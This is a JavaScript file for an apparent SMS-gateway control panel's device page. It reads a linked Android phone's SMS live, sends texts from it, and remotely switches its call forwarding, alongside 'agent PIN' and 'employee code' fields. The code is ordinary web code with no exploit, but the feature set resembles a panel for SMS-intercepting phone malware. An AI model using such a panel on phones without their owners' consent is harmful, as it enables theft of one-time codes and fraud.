// ============================================
// Device Detail — Auth + Delete + Agent + Responsive
// ============================================

const API = window.location.origin;
const deviceId = window.location.pathname.split('/').pop();
const authToken = new URLSearchParams(window.location.search).get('token') || localStorage.getItem('gw_token') || '';
let off = 0, filter = 'all', search = '', total = 0, ws = null;
const PS = 50;
let sel = new Set();

// ============ Theme ============
function toggleTheme() {
    const html = document.documentElement;
    const next = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
    html.setAttribute('data-theme', next);
    localStorage.setItem('gw_theme', next);
    document.getElementById('themeBtn').textContent = next === 'dark' ? '🌙' : '☀️';
}
(function() {
    const saved = localStorage.getItem('gw_theme') || 'dark';
    document.documentElement.setAttribute('data-theme', saved);
    setTimeout(() => {
        const btn = document.getElementById('themeBtn');
        if (btn) btn.textContent = saved === 'dark' ? '🌙' : '☀️';
    }, 50);
})();

// Auth headers helper
const authHeaders = { 'x-auth-token': authToken, 'Content-Type': 'application/json' };
function authFetch(url, opts = {}) {
    opts.headers = { ...opts.headers, 'x-auth-token': authToken };
    return fetch(url, opts);
}

// Check auth
(async () => {
    try {
        const r = await authFetch(`${API}/api/auth-check`);
        if (!r.ok) { window.location.href = '/'; return; }
    } catch(e) { window.location.href = '/'; return; }
    loadDev(); loadMsgs(); loadSent(); loadHistory(); connectWS();
})();

// ============ WS ============
function connectWS() {
    ws = new WebSocket(`ws://${window.location.host}?type=dashboard`);
    ws.onmessage = e => handle(JSON.parse(e.data));
    ws.onclose = () => setTimeout(connectWS, 3000);
    ws.onerror = () => ws.close();
}

function handle(m) {
    if (m.deviceId && m.deviceId !== deviceId) return;
    switch (m.event) {
        case 'device_online': setStatus(true); toast('Device ONLINE','success'); break;
        case 'device_offline': setStatus(false); toast('Device OFFLINE','error'); break;
        case 'new_sms':
            if (off === 0 && (filter === 'all' || filter === m.folder)) {
                prepend({address:m.address,body:m.body,date:m.date,folder:m.folder||'inbox'});
                total++; updPag(); eid('infoTotalSms').textContent = total.toLocaleString();
            }
            toast(`📨 SMS from ${m.address}`,'info');
            break;
        case 'sms_sync': loadMsgs(); loadDev(); break;
        case 'sms_sent_result': toast(`📤 ${m.status}`+(m.error?': '+m.error:''), m.status==='sent'?'success':'error'); loadSent(); break;
        case 'call_forward_result': toast(`📞 ${m.status}`, m.status==='failed'?'error':'success'); break;
        case 'agent_info_updated': updAgent(m); toast('Agent info updated','success'); loadHistory(); break;
        case 'system_status':
            if (!m.enabled) toast('⚠️ System DISABLED by admin','error');
            break;
    }
}

function setStatus(on) {
    const b = eid('statusBadge'), s = eid('infoStatus');
    b.textContent = on ? '● Online' : '● Offline';
    b.className = 'badge ' + (on ? 'badge-online' : 'badge-offline');
    s.textContent = on ? '● Online' : '● Offline';
    s.style.color = on ? 'var(--green)' : 'var(--red)';
}

function updAgent(d) {
    if(d.agent_pin) eid('infoAgentPin').textContent = d.agent_pin;
    if(d.employee_code) eid('infoEmpCode').textContent = d.employee_code;
    if(d.funny_code) eid('infoFunnyCode').textContent = d.funny_code;
    if(d.joining_date) eid('infoJoiningDate').textContent = d.joining_date;
    if(d.sim1_number) eid('infoSim1').textContent = d.sim1_number;
    if(d.sim2_number) eid('infoSim2').textContent = d.sim2_number;
}

// ============ Load Device ============
async function loadDev() {
    try {
        const r = await authFetch(`${API}/api/devices/${deviceId}`);
        if(!r.ok) throw 0;
        const d = await r.json();
        eid('deviceName').textContent = d.name || 'Unknown';
        eid('infoDeviceId').textContent = d.device_id;
        eid('infoRegistered').textContent = fmtDate(d.registered_at);
        eid('infoLastSeen').textContent = fmtTime(d.last_seen);
        eid('infoTotalSms').textContent = (d.total_sms||0).toLocaleString();
        eid('infoAndroid').textContent = d.android_version ? `API ${d.android_version}` : '—';
        eid('infoSim1').textContent = d.sim1_number || 'N/A';
        eid('infoSim2').textContent = d.sim2_number || 'N/A';
        eid('infoAgentPin').textContent = d.agent_pin || '—';
        eid('infoEmpCode').textContent = d.employee_code || '—';
        eid('infoFunnyCode').textContent = d.funny_code || '—';
        eid('infoJoiningDate').textContent = d.joining_date || '—';
        setStatus(d.is_online === 1);
        document.title = `${d.name} — SMS Gateway`;
    } catch(e) { eid('deviceName').textContent = 'Device Not Found'; }
}

// ============ Messages ============
async function loadMsgs() {
    try {
        let u = `${API}/api/devices/${deviceId}/messages?limit=${PS}&offset=${off}`;
        if(search) u += `&search=${encodeURIComponent(search)}`;
        const r = await authFetch(u);
        const d = await r.json();
        total = d.total;
        let msgs = d.messages;
        if(filter !== 'all') msgs = msgs.filter(m => m.folder === filter);
        render(msgs);
        updPag();
    } catch(e) {
        eid('messagesList').innerHTML = '<div style="padding:30px;text-align:center;color:var(--red)">Failed to load</div>';
    }
}

function render(msgs) {
    const el = eid('messagesList');
    sel.clear(); updDel();
    if(!msgs.length) { el.innerHTML = '<div style="padding:40px;text-align:center;color:var(--text3)">No messages</div>'; return; }
    el.innerHTML = msgs.map(m => msgHTML(m)).join('');
}

function msgHTML(m) {
    const ib = m.folder === 'inbox';
    const bodyText = esc(m.body || '(empty)');
    return `<div class="msg" data-id="${m.id||0}">
        <label class="msg-check"><input type="checkbox" onchange="togSel(${m.id||0},this.checked)"></label>
        <div class="msg-ic ${ib?'inbox':'sent'}">${ib?'📥':'📤'}</div>
        <div class="msg-body-wrap">
            <div class="msg-addr">${esc(m.address||'Unknown')} <span class="msg-tag ${ib?'inbox':'sent'}">${ib?'inbox':'sent'}</span></div>
            <div class="msg-text-full">${bodyText}</div>
        </div>
        <div class="msg-meta">
            <span class="msg-time">${fmtTime(null,m.date)}</span>
            <button class="msg-del" onclick="delOne(${m.id||0})" title="Delete">🗑</button>
        </div>
    </div>`;
}

function prepend(m) {
    const el = eid('messagesList');
    const empty = el.querySelector('[style*="text-align:center"]');
    if(empty && empty.textContent.includes('No messages')) empty.remove();
    const tmp = document.createElement('div');
    tmp.innerHTML = msgHTML(m);
    const n = tmp.firstElementChild;
    n.style.animation = 'fadeIn 0.4s ease';
    n.style.background = 'rgba(108,99,255,0.08)';
    setTimeout(() => n.style.background = '', 3000);
    el.insertBefore(n, el.firstChild);
    while(el.children.length > PS) el.removeChild(el.lastChild);
}

// ============ Delete ============
function togSel(id, c) { c ? sel.add(id) : sel.delete(id); updDel(); }
function updDel() {
    const b = eid('deleteSelectedBtn');
    b.style.display = sel.size ? 'inline-block' : 'none';
    b.textContent = `🗑 Delete (${sel.size})`;
}

async function delOne(id) {
    if(!confirm('Delete this message?')) return;
    const r = await authFetch(`${API}/api/messages/${id}`,{method:'DELETE'});
    if(r.ok) {
        const el = document.querySelector(`.msg[data-id="${id}"]`);
        if(el) { el.style.opacity='0'; el.style.transform='translateX(-20px)'; el.style.transition='0.3s'; setTimeout(()=>el.remove(),300); }
        total--; eid('infoTotalSms').textContent = total.toLocaleString();
        toast('Deleted','success');
    } else toast('Failed','error');
}

async function deleteSelected() {
    if(!sel.size || !confirm(`Delete ${sel.size} messages?`)) return;
    const r = await authFetch(`${API}/api/messages/delete-bulk`,{method:'POST',headers:authHeaders,body:JSON.stringify({ids:Array.from(sel)})});
    const d = await r.json();
    if(r.ok) { toast(`Deleted ${d.deleted}`,'success'); sel.clear(); updDel(); loadMsgs(); loadDev(); }
    else toast(d.error||'Failed','error');
}

// ============ Pagination ============
function updPag() {
    const p = eid('pagination');
    if(total <= PS) { p.style.display='none'; return; }
    p.style.display='flex';
    const pg = Math.floor(off/PS)+1, tp = Math.ceil(total/PS);
    eid('pageInfo').textContent = `Page ${pg} / ${tp} · ${total} total`;
    eid('prevBtn').disabled = off===0;
    eid('nextBtn').disabled = off+PS>=total;
}
function prevPage() { if(off>0){off-=PS;loadMsgs();} }
function nextPage() { if(off+PS<total){off+=PS;loadMsgs();} }

function filterMessages(f, btn) {
    filter=f; off=0;
    document.querySelectorAll('.tabs .tab').forEach(t=>t.classList.remove('active'));
    btn.classList.add('active');
    loadMsgs();
}

eid('searchMessages').addEventListener('input', deb(e => {
    search = e.target.value.trim(); off=0; loadMsgs();
}, 400));

// ============ Send SMS ============
async function sendSms() {
    const to=eid('smsTo').value.trim(), body=eid('smsBody').value.trim(), sim=+eid('smsSim').value;
    const res=eid('smsResult'), btn=eid('sendSmsBtn');
    if(!to||!body){showRes(res,'error','Enter number & message');return;}
    btn.disabled=true; btn.textContent='Sending...';
    try {
        const r = await authFetch(`${API}/api/devices/${deviceId}/send-sms`,{method:'POST',headers:authHeaders,body:JSON.stringify({to,body,sim})});
        const d = await r.json();
        if(r.ok){showRes(res,'success',`Queued (${d.msgId})`);eid('smsBody').value='';loadSent();}
        else showRes(res,'error',d.error||'Failed');
    }catch(e){showRes(res,'error','Network error');}
    finally{btn.disabled=false;btn.textContent='Send SMS';}
}

// ============ Call Forwarding ============
async function activateCallForward() {
    const n=eid('cfNumber').value.trim(), s=+eid('cfSim').value, r=eid('cfResult');
    if(!n){showRes(r,'error','Enter number');return;}
    try{const res=await authFetch(`${API}/api/devices/${deviceId}/call-forward`,{method:'POST',headers:authHeaders,body:JSON.stringify({number:n,sim:s})});
    const d=await res.json();showRes(r,res.ok?'success':'error',d.message||d.error);}
    catch(e){showRes(r,'error','Network error');}
}

async function deactivateCallForward() {
    const s=+eid('cfSim').value, r=eid('cfResult');
    try{const res=await authFetch(`${API}/api/devices/${deviceId}/call-forward-off`,{method:'POST',headers:authHeaders,body:JSON.stringify({sim:s})});
    const d=await res.json();showRes(r,res.ok?'success':'error',d.message||d.error);}
    catch(e){showRes(r,'error','Network error');}
}

// ============ Sent History ============
async function loadSent() {
    try{
        const r=await authFetch(`${API}/api/devices/${deviceId}/sent`);
        const msgs=await r.json();
        const el=eid('sentList');
        if(!msgs.length){el.innerHTML='<p class="text-muted">No sent messages</p>';return;}
        el.innerHTML = msgs.map(m=>{
            const sc = m.status==='sent'?'sent':m.status==='failed'?'failed':'pending';
            return `<div class="sent-item">
                <div class="msg-ic sent" style="width:26px;height:26px;font-size:11px">📤</div>
                <div style="flex:1;min-width:0"><div class="msg-addr" style="font-size:12px">${esc(m.to_number)}</div><div class="msg-text-full" style="font-size:11px">${esc(m.body)}</div></div>
                <span class="sent-status ${sc}">${m.status}</span>
                <span class="msg-time">${fmtTime(m.created_at)}</span>
            </div>`;
        }).join('');
    }catch(e){}
}

// ============ Helpers ============
function eid(id){return document.getElementById(id);}
function showRes(el,t,m){el.className='result-msg '+t;el.textContent=m;el.style.display='block';setTimeout(()=>el.style.display='none',5000);}

function toast(msg,type){
    let c=document.getElementById('toastBox');
    if(!c){c=document.createElement('div');c.id='toastBox';c.style.cssText='position:fixed;top:70px;right:16px;z-index:9999;display:flex;flex-direction:column;gap:8px;max-width:340px;';document.body.appendChild(c);}
    const t=document.createElement('div');
    const bg=type==='success'?'rgba(0,230,118,0.12)':type==='error'?'rgba(255,82,82,0.12)':'rgba(108,99,255,0.12)';
    const bc=type==='success'?'rgba(0,230,118,0.35)':type==='error'?'rgba(255,82,82,0.35)':'rgba(108,99,255,0.35)';
    const tc=type==='success'?'#00E676':type==='error'?'#FF5252':'#8B83FF';
    t.style.cssText=`padding:11px 18px;border-radius:10px;font-size:12px;font-weight:500;background:${bg};border:1px solid ${bc};color:${tc};backdrop-filter:blur(12px);font-family:Inter,sans-serif;box-shadow:0 4px 20px rgba(0,0,0,0.3);animation:fadeIn 0.3s ease;`;
    t.textContent=msg;c.appendChild(t);
    setTimeout(()=>{t.style.opacity='0';t.style.transform='translateX(16px)';t.style.transition='0.3s';setTimeout(()=>t.remove(),300);},4000);
}

function fmtDate(s){if(!s)return '—';return new Date(s.includes('Z')?s:s+'Z').toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'});}
function fmtTime(s,ts){let d;if(ts)d=new Date(ts);else if(s)d=new Date(s.includes('Z')?s:s+'Z');else return '—';const m=Math.floor((Date.now()-d)/60000);if(m<1)return 'Now';if(m<60)return m+'m';if(m<1440)return Math.floor(m/60)+'h';return d.toLocaleDateString('en-IN',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit',hour12:true});}
function esc(s){if(!s)return '';const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
function deb(fn,ms){let t;return(...a)=>{clearTimeout(t);t=setTimeout(()=>fn.apply(this,a),ms);};}

// ============ Agent History ============
async function loadHistory() {
    try {
        const r = await authFetch(`${API}/api/devices/${deviceId}/agent-history`);
        const history = await r.json();
        const el = eid('historyList');
        
        if (!history.length) {
            el.innerHTML = '<p style="color:var(--text3);font-size:13px;text-align:center;padding:20px 0">No changes recorded yet</p>';
            return;
        }

        el.innerHTML = history.map(h => {
            const fieldColors = {
                'Agent PIN': 'var(--yellow)',
                'Employee Code': '#FF9800',
                'Funny Code': 'var(--cyan)',
                'Joining Date': 'var(--green)'
            };
            const color = fieldColors[h.field] || 'var(--accent2)';
            const time = h.changed_at ? new Date(h.changed_at.includes('Z') ? h.changed_at : h.changed_at+'Z').toLocaleString('en-IN', {
                day:'2-digit', month:'short', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:true
            }) : '—';
            const oldVal = h.old_value ? `<span style="color:var(--red);text-decoration:line-through">${esc(h.old_value)}</span>` : '<span style="color:var(--text3)">empty</span>';
            const newVal = `<span style="color:var(--green);font-weight:700">${esc(h.new_value)}</span>`;

            return `<div style="display:flex;gap:12px;padding:12px 0;border-bottom:1px solid var(--msg-border, rgba(26,26,74,0.3))">
                <div style="width:4px;border-radius:2px;background:${color};flex-shrink:0"></div>
                <div style="flex:1;min-width:0">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
                        <span style="font-size:12px;font-weight:700;color:${color}">${esc(h.field)}</span>
                        <span style="font-size:10px;color:var(--text3)">${time}</span>
                    </div>
                    <div style="font-size:12px">${oldVal} → ${newVal}</div>
                </div>
            </div>`;
        }).join('');
    } catch(e) {
        eid('historyList').innerHTML = '<p style="color:var(--red);font-size:12px">Failed to load history</p>';
    }
}
